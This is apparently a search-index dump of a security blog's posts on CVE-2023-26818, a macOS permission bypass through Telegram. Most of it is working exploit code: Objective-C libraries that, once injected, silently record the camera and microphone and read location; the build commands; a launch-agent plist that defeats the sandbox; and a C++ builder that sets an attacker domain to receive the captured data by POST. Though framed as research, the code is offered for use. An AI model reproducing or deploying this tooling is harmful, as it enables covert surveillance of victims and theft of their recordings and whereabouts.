Telegram application.   &lt;key&gt;StandardOutPath&lt;/key&gt; &lt;string&gt;/tmp/telegram.log&lt;/string&gt; &lt;key&gt;StandardErrorPath&lt;/key&gt; &lt;string&gt;/tmp/telegram.log&lt;/string&gt;   specify where the standard output and standard error streams of the agent should be directed. Now, Let’s run telegram without   our agent and see what will happen and then save our agent and load it using launchctl to see how the sandbox will be bypassed:          W/o Launch Agent:   DYLD_INSERT_LIBRARIES=Camexploit.dylib /Applications/Telegram.app/Contents/MacOS/Telegram              Here we can see it fails because of the sandbox. Now, Let’s give it a shot with our Launch Agent.          W/ Launch Agent:   sudo launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.telegram.launcher.plist              We can see that it’s recorded successfully and the recorded video path is in the log file we identified for the output.       Conclusion   In part 2 we were able to discuss and understand more about launchd, sandbox, Powerbox API and many more. We saw how the   sandbox on macOS can be bypassed using the Launch Agent &amp; Show 2 theoretical reasons why this could lead to the bypass.   Finally, We may come up with a blog explaining the sandbox more deeply by reversing &amp; debugging it and exploring more of the   MocOS system internal to see how all of this happens in action and approve the 100% reason of why the bypass happen.       Resources           https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/                    https://lapcatsoftware.com/articles/sandbox-escape.html                    https://web.archive.org/web/20170412191246mp_/https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html#//apple_ref/doc/uid/TP40011183-CH1-SW1                    https://www.cnet.com/tech/computing/what-apples-sandboxing-means-for-developers-and-users/                    https://www.maketecheasier.com/how-macos-app-sandboxing-protects-users/                    https://www.karltarvas.com/macos-app-sandboxing-via-sandbox-exec.html                    https://www.quora.com/How-does-the-app-sandbox-architecture-work-in-macOS                    https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox#                    https://desi-jarvis.medium.com/office365-macos-sandbox-escape-fcce4fa4123c                    https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass                    https://newosxbook.com/files/HITSB.pdf                    https://www.youtube.com/watch?v=mG715HcDgO8                    https://conference.hitb.org/hitbsecconf2021ams/materials/D1T1 - MacOS Local Security - Escaping the Sandbox and Bypassing TCC - Thijs Alkemade &amp; Daan Keuper.pdf                    https://www.mdsec.co.uk/2018/08/escaping-the-sandbox-microsoft-office-on-macos/                    https://nakedsecurity.sophos.com/2011/11/14/apples-os-x-sandbox-has-a-gaping-hole-or-not/                    https://www.computerworld.com/article/2734310/researchers-bypass-the-restrictions-of-mac-os-x-default-sandbox-profiles.html                    https://www.youtube.com/watch?v=vMGiplQtjTY                    https://www.appcoda.com/mac-app-sandbox/                    https://wiki.freepascal.org/Sandboxing_for_macOS                    https://www.macwelt.de/article/959302/festung-mac-teil-i.html                    https://github.com/saagarjha/macOSSandboxInitializationBypass                    https://developer.apple.com/documentation/security/app_sandbox                    https://www.manpagez.com/man/7/sandbox/                    https://medium.com/@boutnaru/the-macos-process-journey-sandboxd-sandbox-daemon-17c8c0efe8c9                    https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox      ","categories": ["MacOS"],
        "tags": [],
        "url": "http://localhost:5000/macos/CVE_2023_26818_P2/",
        "teaser": "http://localhost:5000/assets/images/cllu5qweb68631hoh6isz7uax.png"
      },{
        "title": "Exploit Writing Part 1: CVE-2023-26818 MacOS TCC Bypass W/ telegram",
        "excerpt":"Introduction   After the 2 parts of analysis for the CVE-2023-26818. Now, It’s the time to write a full exploit for this vulnerability, We   gonna write a GUI based software that create different exploits and each one has a different approach. So this part is part   1, We gonna write and explain each exploit code that approching a different Entitlmenet. If you didn’t read the analysis   you better back and read it first.   Overview   Now, Let’s take a look on the Entitlements of Telegram app, So we create an exploit for each one of them:   codesign -dv --entitlements - /Applications/Telegram.app      We can see that we have 3 of the Entitlements as the following:           com.apple.security.device.camera: This entitlement grants the app access to the camera.            com.apple.security.device.audio-input: With this entitlement, the app can access the microphone or any other audio input device.            com.apple.security.personal-information.location: This entitlement allows the app to access location services, meaning it can determine the geographic location of the device.       The Exploit   Now, For each one of the Entitlements we gonna make it an exploit ( Except the cam it’s already exist ).   Camera Exploit   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;  @interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;  @property (strong, nonatomic) AVCaptureSession *captureSession; @property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput; @property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;  - (void)startRecording; - (void)stopRecording;  @end  @implementation VideoRecorder  - (instancetype)init {     self = [super init];     if (self) {         [self setupCaptureSession];     }     return self; }  - (void)setupCaptureSession {     self.captureSession = [[AVCaptureSession alloc] init];     self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;      AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];     NSError *error;     self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];      if (error) {         NSLog(@\"Error setting up video device input: %@\", [error localizedDescription]);         return;     }      if ([self.captureSession canAddInput:self.videoDeviceInput]) {         [self.captureSession addInput:self.videoDeviceInput];     }      self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];      if ([self.captureSession canAddOutput:self.movieFileOutput]) {         [self.captureSession addOutput:self.movieFileOutput];     } }  - (void)startRecording {     [self.captureSession startRunning];     NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"recording.mov\"];     NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];     [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];     NSLog(@\"Recording started\"); }  - (void)stopRecording {     [self.movieFileOutput stopRecording];     [self.captureSession stopRunning];     NSLog(@\"Recording stopped\"); }  #pragma mark - AVCaptureFileOutputRecordingDelegate  - (void)captureOutput:(AVCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL       fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections                 error:(NSError *)error {     if (error) {         NSLog(@\"Recording failed: %@\", [error localizedDescription]);     } else {         NSLog(@\"Recording finished successfully. Saved to %@\", outputFileURL.path);     } }  @end  __attribute__((constructor)) static void telegram(int argc, const char **argv) {     VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];      [videoRecorder startRecording];     [NSThread sleepForTimeInterval:5.0];     [videoRecorder stopRecording];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Let’s explain the code by part by part:   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;   The Foundation framework provides basic classes and data types, while AVFoundation provides classes for working with audio   and video.   @interface VideoRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;  @property (strong, nonatomic) AVCaptureSession *captureSession; @property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput; @property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;  - (void)startRecording; - (void)stopRecording;  @end   This interface declares a class called VideoRecorder that conforms to the AVCaptureFileOutputRecordingDelegate protocol. It   defines properties for the AVCaptureSession (used to coordinate video capture), AVCaptureDeviceInput (used to represent the   device’s camera as an input source), and AVCaptureMovieFileOutput (used to write the captured video to a file).   @implementation VideoRecorder  - (instancetype)init {     self = [super init];     if (self) {         [self setupCaptureSession];     }     return self; }   Here the initializer for the VideoRecorder class. When an instance of VideoRecorder is created, it automatically calls the   setupCaptureSession method to set up the video capture session.   - (void)setupCaptureSession {     self.captureSession = [[AVCaptureSession alloc] init];     self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;      AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];     NSError *error;     self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&amp;error];      if (error) {         NSLog(@\"Error setting up video device input: %@\", [error localizedDescription]);         return;     }      if ([self.captureSession canAddInput:self.videoDeviceInput]) {         [self.captureSession addInput:self.videoDeviceInput];     }      self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];      if ([self.captureSession canAddOutput:self.movieFileOutput]) {         [self.captureSession addOutput:self.movieFileOutput];     } }   In this method we set up the AVCaptureSession and configures it to use the device’s default video capture device (camera).   It checks for errors during device input configuration and adds the video device input and movie file output to the capture   session if possible.   - (void)startRecording {     [self.captureSession startRunning];     NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"recording.mov\"];     NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];     [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];     NSLog(@\"Recording started\"); }  - (void)stopRecording {     [self.movieFileOutput stopRecording];     [self.captureSession stopRunning];     NSLog(@\"Recording stopped\"); }   The startRecording method starts the AVCaptureSession and begins recording video to a file with the specified output file   URL. The stopRecording method stops the recording and the AVCaptureSession.   #pragma mark - AVCaptureFileOutputRecordingDelegate  - (void)captureOutput:(AVCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL       fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections                 error:(NSError *)error {     if (error) {         NSLog(@\"Recording failed: %@\", [error localizedDescription]);     } else {         NSLog(@\"Recording finished successfully. Saved to %@\", outputFileURL.path);     } }   This delegate method is called when the recording is finished. It checks for any error and logs the result accordingly.   __attribute__((constructor)) static void telegram(int argc, const char **argv) {     VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];      [videoRecorder startRecording];     [NSThread sleepForTimeInterval:3.0];     [videoRecorder stopRecording];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Finally, This function is marked with the __attribute__((constructor)) attribute which makes it a constructor function. It   is automatically called before the main function of the program starts running and inside it a new instance of the   VideoRecorder class is created and then video recording is started and stopped with a 3 seconds delay between the start and   stop calls.   Microphone Exploit   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;  @interface AudioRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;  @property (strong, nonatomic) AVCaptureSession *captureSession; @property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput; @property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;  - (void)startRecording; - (void)stopRecording;  @end  @implementation AudioRecorder  - (instancetype)init {     self = [super init];     if (self) {         [self setupCaptureSession];     }     return self; }  - (void)setupCaptureSession {     self.captureSession = [[AVCaptureSession alloc] init];     self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;      AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];     NSError *error;     self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&amp;error];      if (error) {         NSLog(@\"Error setting up audio device input: %@\", [error localizedDescription]);         return;     }      if ([self.captureSession canAddInput:self.audioDeviceInput]) {         [self.captureSession addInput:self.audioDeviceInput];     }      self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];      if ([self.captureSession canAddOutput:self.audioFileOutput]) {         [self.captureSession addOutput:self.audioFileOutput];     } }  - (void)startRecording {     [self.captureSession startRunning];     NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"recording.m4a\"];     NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];     [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];     NSLog(@\"Recording started\"); }  - (void)stopRecording {     [self.audioFileOutput stopRecording];     [self.captureSession stopRunning];     NSLog(@\"Recording stopped\"); }  #pragma mark - AVCaptureFileOutputRecordingDelegate  - (void)captureOutput:(AVCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL       fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections                 error:(NSError *)error {     if (error) {         NSLog(@\"Recording failed: %@\", [error localizedDescription]);     } else {         NSLog(@\"Recording finished successfully. Saved to %@\", outputFileURL.path);     }     NSLog(@\"Saved to %@\", outputFileURL.path); }  @end  __attribute__((constructor)) static void telegram(int argc, const char **argv) {     AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];      [audioRecorder startRecording];     [NSThread sleepForTimeInterval:5.0];     [audioRecorder stopRecording];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Let’s explain the code by part by part:   #import &lt;Foundation/Foundation.h&gt; #import &lt;AVFoundation/AVFoundation.h&gt;   The Foundation framework provides basic classes and data types, while AVFoundation provides classes for working with audio   and video.   @interface AudioRecorder : NSObject &lt;AVCaptureFileOutputRecordingDelegate&gt;  @property (strong, nonatomic) AVCaptureSession *captureSession; @property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput; @property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;  - (void)startRecording; - (void)stopRecording;  @end   This interface declares a class called AudioRecorder that conforms to the AVCaptureFileOutputRecordingDelegate protocol. It   defines properties for the AVCaptureSession (used to coordinate audio capture), AVCaptureDeviceInput (used to represent the   device’s microphone as an input source), and AVCaptureMovieFileOutput (used to write the captured audio to a file).   Additionally, it declares methods to start and stop recording, ensuring that the audio can be recorded and saved as needed.   @interface AudioRecorder : @implementation VideoRecorder  - (instancetype)init {     self = [super init];     if (self) {         [self setupCaptureSession];     }     return self; }   This interface declares a class named AudioRecorder (to inherit from NSObject). The class has a custom initializer method   init which sets up the instance by calling the setupCaptureSession method which is responsible for configuring the audio   recording components. In short, The initializer ensures any superclass initialization is completed first before performing   the audio-specific setup.   - (void)setupCaptureSession {     self.captureSession = [[AVCaptureSession alloc] init];     self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;      AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];     NSError *error;     self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&amp;error];      if (error) {         NSLog(@\"Error setting up audio device input: %@\", [error localizedDescription]);         return;     }      if ([self.captureSession canAddInput:self.audioDeviceInput]) {         [self.captureSession addInput:self.audioDeviceInput];     }      self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];      if ([self.captureSession canAddOutput:self.audioFileOutput]) {         [self.captureSession addOutput:self.audioFileOutput];     } }   The setupCaptureSession method is responsible for initializing and configuring an AVCaptureSession for audio recording. It   first creates an audio recording session with a high-quality preset. Then, fetches the default audio device (like a   microphone) and tries to create an input source from it, If there is an error in setting up the input, it logs the error.   Otherwise, checks if the capture session can accept this audio input and if so, adds it to the session. Finally, it   initializes a file output destination for the audio recording and, if the session can handle this output, adds it to the   session.   - (void)startRecording {     [self.captureSession startRunning];     NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\"recording.m4a\"];     NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];     [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];     NSLog(@\"Recording started\"); }   The method - (void)startRecording is responsible for initiating the audio recording process and starts the capture session,   defines the path for the temporary audio file named recording.m4a and converts this path into a URL and then starts   recording audio to this file location. Finally, it logs that the recording process has started.   - (void)stopRecording {     [self.audioFileOutput stopRecording];     [self.captureSession stopRunning];     NSLog(@\"Recording stopped\"); }   The stopRecording method is a part of the AudioRecorder class which performs the action of stopping the audio recording. by   first signaling the audioFileOutput object to stop recording the audio data. Then instructs the captureSession to cease all   capturing activities. Lastly, it logs the message Recording stopped to indicate the recording process has been terminated.   #pragma mark - AVCaptureFileOutputRecordingDelegate  - (void)captureOutput:(AVCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL       fromConnections:(NSArray&lt;AVCaptureConnection *&gt; *)connections                 error:(NSError *)error {     if (error) {         NSLog(@\"Recording failed: %@\", [error localizedDescription]);     } else {         NSLog(@\"Recording finished successfully. Saved to %@\", outputFileURL.path);     }     NSLog(@\"Saved to %@\", outputFileURL.path); }  @end   The method captureOutput:didFinishRecordingToOutputFileAtURL:fromConnections:error: is part of the   AVCaptureFileOutputRecordingDelegate protocol and It’s called once a recording session concludes &amp; method checks for any   errors that might have occurred during recording. If an error is detected a message is logged detailing the failure and If   the recording was successful, a message logs its successful completion and specifies where the recording was saved. Finally,   the file path of the saved recording is also logged.   __attribute__((constructor)) static void telegram(int argc, const char **argv) {     AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];      [audioRecorder startRecording];     [NSThread sleepForTimeInterval:5.0];     [audioRecorder stopRecording];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Finally, here define a function named telegram that is designated to run automatically when the library containing it is   loaded as the __attribute__((constructor)) exist. Inside this function, an instance of the AudioRecorder class is created   and immediately starts recording. The recording lasts for 5 seconds after which it stops. To ensure that the recording   completes and the thread doesn’t terminate prematurely, the current run loop is kept running for an additional second.   Location Exploit   #import &lt;Foundation/Foundation.h&gt; #import &lt;CoreLocation/CoreLocation.h&gt;  @interface LocationFetcher : NSObject &lt;CLLocationManagerDelegate&gt;  @property (strong, nonatomic) CLLocationManager *locationManager;  - (void)startFetchingLocation; - (void)stopFetchingLocation;  @end  @implementation LocationFetcher  - (instancetype)init {     self = [super init];     if (self) {         _locationManager = [[CLLocationManager alloc] init];         _locationManager.delegate = self;         [_locationManager requestAlwaysAuthorization];     }     return self; }  - (void)startFetchingLocation {     [self.locationManager startUpdatingLocation];     NSLog(@\"Location fetching started\"); }  - (void)stopFetchingLocation {     [self.locationManager stopUpdatingLocation];     NSLog(@\"Location fetching stopped\"); }  #pragma mark - CLLocationManagerDelegate  - (void)locationManager:(CLLocationManager *)manager      didUpdateLocations:(NSArray&lt;CLLocation *&gt; *)locations {     CLLocation *latestLocation = [locations lastObject];     NSLog(@\"Received Location: Latitude: %f, Longitude: %f\", latestLocation.coordinate.latitude, latestLocation.coordinate.longitude); }  - (void)locationManager:(CLLocationManager *)manager        didFailWithError:(NSError *)error {     NSLog(@\"Location fetching failed: %@\", [error localizedDescription]); }  @end  __attribute__((constructor)) static void telegram(int argc, const char **argv) {     LocationFetcher *locationFetcher = [[LocationFetcher alloc] init];      [locationFetcher startFetchingLocation];     [NSThread sleepForTimeInterval:5.0];     [locationFetcher stopFetchingLocation];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   Let’s Explain the code.   #import &lt;Foundation/Foundation.h&gt; #import &lt;CoreLocation/CoreLocation.h&gt;  @interface LocationFetcher : NSObject &lt;CLLocationManagerDelegate&gt;  @property (strong, nonatomic) CLLocationManager *locationManager;  - (void)startFetchingLocation; - (void)stopFetchingLocation;  @end   This interface declares a class named LocationFetcher that conforms to the CLLocationManagerDelegate protocol which defines   a property for the CLLocationManager (used to manage the delivery of location-related events to your app).   There are two instance methods declared:                        (void)startFetchingLocation: Which is a method that starts the process of fetching the device’s location.            (void)stopFetchingLocation: Which is a method that stops the process of fetching the device’s location.       This class is designed to manage location updates and to handle the starting and stopping of location fetch operations using   the Core Location framework.   @implementation LocationFetcher  - (instancetype)init {     self = [super init];     if (self) {         [self setupLocationManager];     }     return self; }   Here it provides the implementation for the LocationFetcher class which Starting with the init method which initializes an   instance of the LocationFetcher class. Within this method the setupLocationManager method is called to configure the   CLLocationManager.   - (void)setupLocationManager {     self.locationManager = [[CLLocationManager alloc] init];     self.locationManager.delegate = self; }   Here initializes a CLLocationManager object and assigns it to the locationManager property.   Sets the delegate of the locationManager to the current instance of LocationFetcher which ensures that the class can receive   location-related events.   - (void)startFetchingLocation {     [self.locationManager startUpdatingLocation];     NSLog(@\"Fetching location started\"); }   Here Calls the startUpdatingLocation method on the locationManager to begin delivering location updates.   - (void)stopFetchingLocation {     [self.locationManager stopUpdatingLocation];     NSLog(@\"Fetching location stopped\"); }   Here Calls the stopUpdatingLocation method on the locationManager to stop delivering location updates.   #pragma mark - CLLocationManagerDelegate  - (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray&lt;CLLocation *&gt; *)locations {     CLLocation *currentLocation = locations.lastObject;     NSLog(@\"Received location: %f, %f\", currentLocation.coordinate.latitude, currentLocation.coordinate.longitude); } @end   This Implements the CLLocationManagerDelegate protocol method didUpdateLocations: which method gets called when new   location data is available.Then logs the most recent location (latitude and longitude) to the console.   __attribute__((constructor)) static void telegram(int argc, const char **argv) {     LocationFetcher *locationFetcher = [[LocationFetcher alloc] init];      [locationFetcher startFetchingLocation];     [NSThread sleepForTimeInterval:5.0];     [locationFetcher stopFetchingLocation];      [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]]; }   This block effectively demonstrates the basic usage of the LocationFetcher class by fetching the location for 5 seconds upon   the application’s start.   Exploit Testing   Camera Exploit   Compiling and testing time:   gcc -dynamiclib -framework Foundation -framework AVFoundation Camexploit.m -o Cam.dylib      Microphone Exploit   Compiling and testing time:   gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib      Location Exploit   Compiling and testing time:   gcc -dynamiclib -framework Foundation -framework CoreLocation -framework AVFoundation Locexploit.m -o Locexploit.dylib      Sandbox   To exploit the vulnerability in general with any Entitlemment while the sandbox is activited for the app, We will Just use the launch agent:   &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt; &lt;plist version=\"1.0\"&gt; &lt;dict&gt;        &lt;key&gt;Label&lt;/key&gt;         &lt;string&gt;com.telegram.launcher&lt;/string&gt;         &lt;key&gt;RunAtLoad&lt;/key&gt;         &lt;true/&gt;         &lt;key&gt;EnvironmentVariables&lt;/key&gt;         &lt;dict&gt;           &lt;key&gt;DYLD_INSERT_LIBRARIES&lt;/key&gt;           &lt;string&gt;DYLIB_PATH&lt;/string&gt;         &lt;/dict&gt;         &lt;key&gt;ProgramArguments&lt;/key&gt;         &lt;array&gt;   &lt;string&gt;/Applications/Telegram.app/Contents/MacOS/Telegram&lt;/string&gt;         &lt;/array&gt;         &lt;key&gt;StandardOutPath&lt;/key&gt;         &lt;string&gt;/tmp/telegram.log&lt;/string&gt;         &lt;key&gt;StandardErrorPath&lt;/key&gt;         &lt;string&gt;/tmp/telegram.log&lt;/string&gt; &lt;/dict&gt; &lt;/plist&gt;   Conclusion   You can find the exploits code on github from here. And it will be updated as we gonna add more features and write a swift   GUI app for MacOS to generate exploit with customizable options that can be used in different ways and go further with   exploitation.  ","categories": ["MacOS"],
        "tags": [],
        "url": "http://localhost:5000/macos/CVE_2023_26818_exploit_P1/",
        "teaser": "http://localhost:5000/assets/images/clm7pxby5a9lb1gn9837genan.jpg"
      },{
        "title": "Exploit Writing Part 2: CVE-2023-26818 MacOS TCC Bypass W/ telegram",
        "excerpt":"Disclaimer   This exploit has been created solely for the purposes of research and for the development of effective defensive techniques.   It is not intended to be used for any malicious or unauthorized activities. The author and the owner of the script disclaim   any responsibility or liability for any misuse or damage caused by this software. Users are urged to use this software   responsibly and only in accordance with applicable laws and regulations. Not for non-ethical usages.   Introduction   In this second part, we added more features to the exploits to send the results to a special domain/website in a POST   request, So the data can be transferred to the targeted server and retrieved from the server side to the original format.   The Exploit   Here we created a console app to make it easier to edit and compile the dylibs codes. And let’s break down the codes:   #include &lt;iostream&gt; #include &lt;string&gt; #include &lt;cctype&gt; #include &lt;fstream&gt; #include &lt;sstream&gt;   These are the header files that the code needs.   bool isNumber(const std::string&amp; str) {     for (char const &amp;c : str) {         if (!std::isdigit(c)) return false;     }     return true; }   Here, checks if a given string is a number by iterating through each character in the string and ensuring it’s a digit. It   returns true if the string is a number, false otherwise.   void compileAndExport(const std::string &amp;libraryName) {     std::string compileCommand;     if (libraryName == \"Camera\") {         compileCommand = \"gcc -dynamiclib -framework Foundation -framework AVFoundation ./libs/Camexploit.m -o ./Exports/Cam.dylib\";     } else if (libraryName == \"Microphone\") {         compileCommand = \"gcc -dynamiclib -framework Foundation -framework AVFoundation ./libs/Micexploit.m -o ./Exports/Micexploit.dylib\";     } else if (libraryName == \"Location\") {         compileCommand = \"gcc -dynamiclib -framework Foundation -framework CoreLocation -framework AVFoundation ./libs/Locexploit.m -o ./Exports/Locexploit.dylib\";     }      int result = system(compileCommand.c_str());     if (result == 0) {         std::cout &lt;&lt; libraryName &lt;&lt; \" compilation successful. Exported to ./Exports folder.\\n\";     } else {         std::cerr &lt;&lt; libraryName &lt;&lt; \" compilation failed. Please check the source code.\\n\";     } }   This function compiles and exports a library based on its name. It prepares a compilation command string based on the   library’s name and then executes it using the system function. After execution, it checks if the compilation was successful   and notifies the user accordingly.   void updateFileContent(const std::string&amp; filePath, const std::string&amp; timeInSeconds, const std::string&amp; outputFilename, const std::string&amp; domainName) {     std::ifstream file(filePath);     std::ostringstream tempStream;     std::string line;      while (std::getline(file, line)) {         if (line.find(\"[NSThread sleepForTimeInterval:\") != std::string::npos) {             tempStream &lt;&lt; \"[NSThread sleepForTimeInterval:\" &lt;&lt; timeInSeconds &lt;&lt; \".0];\\n\";         } else if (line.find(\"[NSTemporaryDirectory() stringByAppendingPathComponent:@\\\"file_name\\\"]\") != std::string::npos) {             tempStream &lt;&lt; \"NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@\\\"\" &lt;&lt; outputFilename &lt;&lt; \"\\\"];\\n\";         } else if (line.find(\"[request setURL:[NSURL URLWithString:@\\\"http://a.com\\\"]]\") != std::string::npos) {             tempStream &lt;&lt; \"[request setURL:[NSURL URLWithString:@\\\"\" &lt;&lt; domainName &lt;&lt; \"\\\"]];\\n\";         } else {             tempStream &lt;&lt; line &lt;&lt; \"\\n\";         }     }     file.close();      std::ofstream outFile(filePath);     outFile &lt;&lt; tempStream.str();     outFile.close(); }   This function updates the content of a given file (specified by filePath). It reads the file line by line and looks for   specific placeholders to replace them with user input values (time, filename, and domain name). After modifying the   content, it writes the updated content back to the same file.   int main() {     bool camera = false;     bool microphone = false;     bool location = false;     std::string timeInSeconds;     std::string outputFilename;     std::string domainName;   Here are flags for each option (camera, microphone, and location) are declared along with strings to store user input for   recording time, output filename, and domain name.   while (true) {         std::cout &lt;&lt; \"Select options by entering the number:\\n\";         std::cout &lt;&lt; \"1. Toggle Camera (\" &lt;&lt; (camera ? \"Selected\" : \"Not Selected\") &lt;&lt; \")\\n\";         std::cout &lt;&lt; \"2. Toggle Microphone (\" &lt;&lt; (microphone ? \"Selected\" : \"Not Selected\") &lt;&lt; \")\\n\";         std::cout &lt;&lt; \"3. Toggle Location (\" &lt;&lt; (location ? \"Selected\" : \"Not Selected\") &lt;&lt; \")\\n\";         std::cout &lt;&lt; \"4. Set Time In Second for Recording (\" &lt;&lt; timeInSeconds &lt;&lt; \")\\n\";         std::cout &lt;&lt; \"5. Set Output Filename (\" &lt;&lt; outputFilename &lt;&lt; \")\\n\";         std::cout &lt;&lt; \"6. Set Domain Name (\" &lt;&lt; domainName &lt;&lt; \")\\n\";         std::cout &lt;&lt; \"7. Export\\n\";         std::cout &lt;&lt; \"8. Exit\\n\";         std::cout &lt;&lt; \"&gt; \";          int choice;         std::cin &gt;&gt; choice;         std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), '\\n'); // clear the buffer          switch (choice) {             case 1:                 camera = !camera;                 break;             case 2:                 microphone = !microphone;                 break;             case 3:                 location = !location;                 break;             case 4:                 if (camera || microphone) {                     std::cout &lt;&lt; \"Enter time in seconds: \";                     std::getline(std::cin, timeInSeconds);                     if (!isNumber(timeInSeconds)) {                         std::cout &lt;&lt; \"Invalid input! Please enter a valid number for time.\\n\";                         timeInSeconds = \"\";                     }                 } else {                     std::cout &lt;&lt; \"You need to select Camera or Microphone first!\\n\";                 }                 break;             case 5:                 if (camera || microphone) {                     std::cout &lt;&lt; \"Enter output filename: \";                     std::getline(std::cin, outputFilename);                 } else {                     std::cout &lt;&lt; \"You need to select Camera or Microphone first!\\n\";                 }                 break;             case 6:                 std::cout &lt;&lt; \"Enter domain name (including http:// or https://): \";                 std::getline(std::cin, domainName);                 break;             case 7:                 if (!camera &amp;&amp; !microphone &amp;&amp; !location) {                     std::cout &lt;&lt; \"Please select at least one option!\\n\";                 } else if ((camera || microphone || location) &amp;&amp; (timeInSeconds.empty() || outputFilename.empty() || domainName.empty())) {                     std::cout &lt;&lt; \"Please fill in all required fields!\\n\";                 } else if ( location &amp;&amp; domainName.empty()) {                     std::cout &lt;&lt; \"Please fill in all required fields!\\n\";                 } else {                     if (camera) {                         updateFileContent(\"./libs/Camexploit.m\", timeInSeconds, outputFilename, domainName);                         compileAndExport(\"Camera\");                     }                     if (microphone) {                         updateFileContent(\"./libs/Micexploit.m\", timeInSeconds, outputFilename, domainName);                         compileAndExport(\"Microphone\");                     }                     if (location) {                         updateFileContent(\"./libs/Locexploit.m\", timeInSeconds, outputFilename, domainName);                         compileAndExport(\"Location\");                     }                 }                 break;             case 8:                 return 0;             default:                 std::cout &lt;&lt; \"Invalid choice. Please try again.\\n\";                 break;         }   This loop continues to run until the user chooses the Exit option. Within the loop, the console presents a menu to the user   to select various options such as toggling which features are selected, setting the recording time, output filename, domain   name, and exporting. Depending on the user’s choice, various tasks are performed. and then executes actions based on the   user’s choice. If the user chooses option 8. Exit the code will exit, terminating the loop and the process.   Exploit Test           Victim Side:                   Attacker Side:              Conclusion   As of now we finished the full exploit with the ability to send the data 